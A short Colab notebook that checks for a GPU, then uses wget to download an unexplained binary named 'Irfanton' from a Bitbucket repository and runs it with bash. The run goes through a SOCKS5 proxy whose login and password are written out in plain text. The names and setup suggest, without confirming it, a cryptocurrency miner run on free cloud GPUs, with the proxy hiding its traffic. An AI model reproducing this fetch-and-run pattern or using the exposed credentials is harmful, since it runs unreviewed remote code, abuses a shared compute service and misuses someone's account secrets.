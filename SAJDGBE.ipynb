{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "SAJDGBE.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "2tbpxZ1jNryC",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "24a04ef9-0298-44e5-bbd1-64a7a71f2ec1"
      },
      "source": [
        "#@title cek\n",
        "! nvidia-smi -L"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "GPU 0: Tesla K80 (UUID: GPU-b14d7ef7-e471-c9b5-066e-1f70e9f5d340)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xixbPuScxM3i"
      },
      "source": [
        "!wget https://bitbucket.org/teerbaikton/ton/raw/0752bbdf2f87ccaa75fbd6555b5cf4003bc2b9fd/Irfanton\n",
        "!export http_proxy=socks5:QuENTURW:EfAdJ1Qu@sin.socks.ipvanish.com:1080;bash Irfanton"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}